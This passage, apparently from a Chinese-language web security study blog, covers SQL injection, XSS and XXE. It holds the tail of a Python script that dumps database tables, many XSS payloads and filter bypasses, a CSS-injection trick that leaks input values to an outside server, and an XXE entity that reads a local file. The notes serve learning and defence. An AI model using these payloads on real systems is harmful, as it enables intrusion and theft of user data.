class="string">&#x27;The current database:&#x27;</span>, db_name)</span><br><span class="line"></span><br><span class="line">    db_hex = <span class="string">&#x27;0x&#x27;</span> + db_name.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    tables = table_name(url, db_hex)</span><br><span class="line">    <span class="built_in">print</span>(db_name, <span class="string">&#x27;has tables:&#x27;</span>, tables)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tbl <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;tbl&#125;</span> has columns:&#x27;</span>)</span><br><span class="line">        tbl_hex  = <span class="string">&#x27;0x&#x27;</span> + tbl.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">        cols     = column_name(url, tbl_hex)</span><br><span class="line">        contents = all_content(url, tbl, cols)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;tbl&#125;</span>\&#x27;s content: <span class="subst">&#123;contents&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Use: %d seconds&#x27;</span> % (time.time() - start_time))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h2><p>（好像现在越来越常见了）（结合CSRF进行攻击）</p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1611465">XSS跨站脚本攻击详解（包括攻击方式和防御方式）-阿里云开发者社区</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/likinguuu/article/details/136530759">【Web安全】XSS攻击与绕过_输入框xss攻击-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yu-Xing-Hai/p/18597430/XSS">XSS跨站脚本攻击详解 - 宇星海 - 博客园</a></p>
<p><strong>XSS(Cross Site Scripting)</strong>，通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容</p>
<p>最常见的就是</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>会在网页上弹出一个1</p>
<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，与之间的字符是页面的标题等等</p>
<p>当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行</p>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><img src="/img/lazy.gif" data-original="xss1.png" alt=""></p>
<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><img src="/img/lazy.gif" data-original="xss1.png" alt=""></p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM型XSS攻击（Document Object Model Cross-Site Scripting）是一种特殊的XSS攻击，其原理是利用客户端浏览器对DOM（文档对象模型）的操作进行攻击。与传统的XSS攻击不同，DOM型XSS攻击不需要服务器端的参与，而是完全在客户端执行</p>
<p>DOM型XSS攻击的主要原理是攻击者通过构造恶意URL，向目标网页传递参数，然后在客户端浏览器中执行恶意脚本。当目标网页的JavaScript代码解析URL参数并将其插入到DOM中时，如果没有对参数进行适当的过滤和处理，就可能导致恶意脚本的执行</p>
<p>看以下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Based XSS Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function xsstest() &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var str = document.getElementById(&quot;input&quot;).value;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementById(&quot;output&quot;).innerHTML = &quot;<span class="tag">&lt;<span class="name">img</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">        <span class="attr">src</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input&quot;</span> <span class="attr">size</span>=<span class="string">50</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xsstest()&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>submit按钮的onclick事件调用了xsstest()函数。而在xsstest()中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，造成了DOM Based XSS</p>
<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这是最基本的XSS攻击形式。</p>
<p>通过插入<code>&lt;script&gt;</code>标签，攻击者可以在受害者的浏览器上执行任意JavaScript代码</p>
<h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用<code>&lt;img&gt;</code>标签的<code>onerror</code>事件。如果图片加载失败（例如，<code>src</code>设置为不存在的资源），则执行<code>onerror</code>中的JavaScript代码</p>
<p>这边可以插入以下两篇文章，鉴于本文标题的关系，不作展开</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6017">利用突变XSS绕过DOMPurify 2.0.0-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CQ17743254852/article/details/132545261">DOM破坏绕过XSSfilter例题_dompurify.sanitize绕过-CSDN博客</a></p>
<h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>onblur</code>事件在元素失去焦点时触发，<code>onfocus</code>在元素获得焦点时触发，<code>onclick</code>在点击时触发，<code>onmouseover</code>在鼠标悬停时触发</p>
<p>“焦点”指的是<strong>当前正在被用户交互的元素</strong></p>
<ol>
<li><strong>键盘焦点</strong>：<br>当你按 <code>Tab</code> 键时，浏览器会将焦点依次移动到可交互元素（如输入框、按钮、链接等）。此时，该元素会触发 <code>onfocus</code> 事件，失去焦点的元素触发 <code>onblur</code></li>
<li><strong>鼠标焦点</strong>：<br>点击一个输入框时，光标（caret）会出现在其中，表示它获得了焦点，可以输入文字</li>
<li><strong>视觉表现</strong>：<br>大多数浏览器会为当前焦点元素显示<strong>轮廓线（outline）</strong>（如蓝色边框），或高亮效果（可通过 CSS 的 <code>:focus</code> 伪类自定义）</li>
</ol>
<h4 id="details标签"><a href="#details标签" class="headerlink" title="details标签"></a>details标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用HTML5的<code>&lt;details&gt;</code>标签，当用户切换显示/隐藏详情时，触发<code>ontoggle</code>事件</p>
<h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用SVG图像格式的<code>&lt;svg&gt;</code>标签。<code>onload</code>事件在SVG加载完成时触发，可以用于执行恶意代码</p>
<h4 id="select标签"><a href="#select标签" class="headerlink" title="select标签"></a>select标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在<code>&lt;select&gt;</code>标签中使用<code>onfocus</code>事件。当下拉列表获得焦点时，触发JavaScript代码</p>
<h4 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用<code>&lt;iframe&gt;</code>标签的<code>onload</code>事件。当iframe加载完成后，执行指定的JavaScript代码</p>
<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过<code>&lt;video&gt;</code>标签中的<code>&lt;source&gt;</code>元素的<code>onerror</code>事件。如果视频源文件加载失败，将执行错误处理代码</p>
<h4 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果音频文件加载失败，将触发<code>onerror</code>事件</p>
<h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>当页面加载完成时，会执行此代码</p>
<h4 id="textarea标签"><a href="#textarea标签" class="headerlink" title="textarea标签"></a>textarea标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当文本区域获得焦点时，将执行指定的JavaScript代码</p>
<h4 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.gogle.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/init//en_All/images/logolw.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>//<code>&lt;base&gt;</code>标签将指定其后的标签默认从”<a target="_blank" rel="noopener" href="http://www.gogle.com&quot;取host域名">http://www.gogle.com&quot;取host域名</a></p>
<p>如果攻击者在页面中插入了<code>&lt;base&gt;</code>标签并指定域名为恶意站点，就可以在远程服务器上伪造数据，劫持当前页面中所有使用“相对路径”的标签</p>
<h3 id="部分绕过"><a href="#部分绕过" class="headerlink" title="部分绕过"></a>部分绕过</h3><h4 id="括号绕过"><a href="#括号绕过" class="headerlink" title="括号绕过"></a>括号绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>当括号被过滤的时候可以使用<strong>throw</strong>来绕过。throw 语句用于当错误发生时抛出一个错误</p>
<h4 id="URL绕过"><a href="#URL绕过" class="headerlink" title="URL绕过"></a>URL绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 使用URL编码</span><br><span class="line">// 十进制、八进制、十六进制IP</span><br><span class="line">// 用//代替http://</span><br><span class="line">// 使用中文句号代替英文点号</span><br></pre></td></tr></table></figure>
<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;   o_n和&lt;scr_ipt&gt;过滤</span><br></pre></td></tr></table></figure>
<h4 id="利用Function"><a href="#利用Function" class="headerlink" title="利用Function"></a>利用Function</h4><p>JS有一个特性是 <code>Function()();</code>（注意这一定是要大写）</p>
<p>对于Function()来说，写在其第一个括号内的JS语句会被直接执行，例如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="title function_">alert</span>(<span class="number">1</span>))();</span><br></pre></td></tr></table></figure>
<p>就可以成功被执行，这里还可以利用<code>atob()</code>，它的作用是把后面的base64编码还原（需要去掉=）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(atob<span class="string">`YWxlcnQoZG9jdW1lbnQuY29va2llKQ`</span>)();   <span class="comment">//反引号代替括号使用，括号也是可以的</span></span><br></pre></td></tr></table></figure>
<h3 id="针对CSS的XSS"><a href="#针对CSS的XSS" class="headerlink" title="针对CSS的XSS"></a>针对CSS的XSS</h3><p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/ch3/css-injection/">只用 CSS 也能攻擊？CSS injection（上） | Beyond XSS</a></p>
<p>（这个大有研究价值，我后面会再补的）</p>
<p>CSS Leak 即通过 CSS 注入实现 XS Leak, 一个常见的方法是利用 CSS 选择器匹配指定标签的某个属性的内容</p>
<p>例如,  目标网站存在 HTML</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">value</span>=<span class="string">&quot;world&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据参考文章, 当网站可以注入 CSS 时, 便可以通过属性选择器匹配 input 标签内的 value 属性</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;hello&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;w&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=w</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该 CSS 的作用如下</p>
<ol>
<li>通过属性选择器匹配某个 input 标签, 其 name 属性的值为 hello, 且 value 属性以 <code>w</code> 开头</li>
<li>如果成功匹配, 则会向 <code>https://myserver.com?q=w</code> 发起 HTTP 请求</li>
</ol>
<p>通过上述过程, 便可以一步一步地拿到 value 标签的所有内容</p>
<p>…</p>
<hr>
<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">XML外部实体（XXE）注入详解 - 渗透测试中心 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/661059679">(10 封私信 / 80 条消息) 从原理到实战，详解XXE攻击 - 知乎</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6483">从XML相关一步一步到XXE漏洞-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/xxe.html">【WEB】XXE | 狼组安全团队公开知识库</a></p>
<p>（这个见的确实不多，甚至是不见了）</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>XML 指可扩展标记语言（Extensible Markup Language)，是一种与HTML类似的纯文本的标记语言，设计宗旨是为了传输数据，而非显示数据。它由三个部分组成，分别是：文档类型定义（Document Type Definition，<strong>DTD</strong>），即XML的布局语言；可扩展的样式语言（Extensible Style Language，<strong>XSL</strong>），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，<strong>XLL</strong>）</p>
<p>XML使用元素和属性来描述数据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构，其基本格式如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   // XML生命</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  文件名 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY实体名 <span class="string">&quot;实体内容&quot;</span>&gt;</span>                  // 文档类型定义(DTD)</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">元素名称</span> <span class="attr">category</span>=<span class="string">&quot;属性&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">WHiteNight                               // 文档元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">元素名称</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>所有 XML 元素都须有关闭标签</li>
<li>XML 标签对大小写敏感</li>
<li>XML 必须正确地嵌套</li>
<li>XML 文档必须有根元素</li>
<li>XML 的属性值须加引号</li>
</ul>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>DTD（Document Type Definition）：</strong>通过定义根节点、元素（ELEMENT）、属性（ATTLIST）、实体（ENTITY）等约束了xml文档的内容按照指定的格式承载数据</p>
<p><img src="/img/lazy.gif" data-original="xml1.png" alt=""></p>
<h4 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h4><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [                     &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from)&gt;            &lt;!--定义note元素有两个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;              &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;            &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;White&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Night&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p><strong>PCDATA</strong>的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开（解析器将实体引用替换为该实体所代表的实际内容）<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换<br><strong>CDATA</strong>意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p>
<p>例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span>&gt;</span>这是一个 <span class="symbol">&amp;lt;</span> 示例 <span class="symbol">&amp;amp;</span> 实体引用。<span class="tag">&lt;/<span class="name">element</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实体展开后：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一个 &lt; 示例 &amp; 实体引用。</span><br></pre></td></tr></table></figure>
<h4 id="外部引入"><a href="#外部引入" class="headerlink" title="外部引入"></a>外部引入</h4><p><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code> （外部的DTD文件）</p>
<p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code> （网上的DTD文件）</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;White&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Night&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Honkai&lt;/head&gt;</span><br><span class="line">&lt;body&gt;StarRailway&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p>test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="实体（ENTITY）"><a href="#实体（ENTITY）" class="headerlink" title="实体（ENTITY）"></a>实体（ENTITY）</h4><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，按照<strong>有无参数分类</strong>，可以分为一般实体和参数实体</p>
<p>一般声明：<code>&lt;!ENTITY 实体名称 “实体内容”&gt;</code>，而想要引用一般实体，用 <code>&amp;实体名称</code>（引用区域不限）</p>
<p>参数声明：<code>&lt;!ENTITY % 实体名称 “实体内容”&gt;</code> ，引用参数实体方法：<code>%实体名称</code>（只能在DTD中引用）</p>
<p><strong>按照使用方式分类</strong>，分为内部声明实体和引用外部实体</p>
<p>内部实体：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY writer &quot;xxx&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright xxx.com&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
<p>外部实体：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code> 或者 <code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http://www.xxx.com/xxx.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;file;©right;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
<p>下面是不同程序所支持的协议</p>
